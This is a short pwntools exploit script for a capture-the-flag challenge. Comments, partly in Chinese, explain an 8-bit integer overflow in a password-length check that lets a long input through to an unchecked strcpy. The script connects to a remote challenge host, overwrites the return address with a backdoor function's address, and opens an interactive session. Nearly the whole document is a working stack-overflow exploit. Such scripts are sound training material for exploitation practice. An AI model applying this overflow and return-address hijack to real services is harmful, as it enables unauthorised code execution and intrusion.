from pwn import *

'''
# 关键代码：（uint8整数溢出）
char *__cdecl check_passwd(char *s)
{
  char dest[11]; // [esp+4h] [ebp-14h] BYREF
  unsigned __int8 v3; // [esp+Fh] [ebp-9h]

  v3 = strlen(s);
  if ( v3 <= 3u || v3 > 8u )
  {
    puts("Invalid Password");
    return (char *)fflush(stdout);
  }
  else
  {
    puts("Success");
    fflush(stdout);
    return strcpy(dest, s);
  }
}
'''

'''
typedef     char            INT8;/**< -127~+127 */
typedef     unsigned char   UINT8;/**< 0~255 */    <----------------------------
typedef     short           INT16;/**< -32767~+32767 */
typedef     unsigned short  UINT16;/**< 0~+65535 */
typedef     int             INT32;/**< -2147483647 ~+2147483647*/
typedef     unsigned int    UINT32;/**< 0~4294967295 */
'''
r = remote('61.147.171.105', 57136)
context.log_level = 'debug'

backdoor = 0x804868B
payload = b'A' * (0x14 + 4) + p32(backdoor)
# 当给v8赋值超过255时，比如256，即1 0000 0000，由于v8本身只有8位，所以超过8位的，就会发生高位截断，只会保留低位，
# 所以这个1会被舍弃，v8的值就是0000 0000，而给v8赋值257，它的值就是1，赋值258，它的值就是2。
# 所以只要让payload的长度在(259,264]内，就能让v8的值在(3,8]内
payload = payload.ljust(260, b'B')
r.sendlineafter(b'choice:', b'1')
r.sendlineafter(b'username:', b'admin')
r.sendlineafter(b'passwd:', payload)
r.interactive()
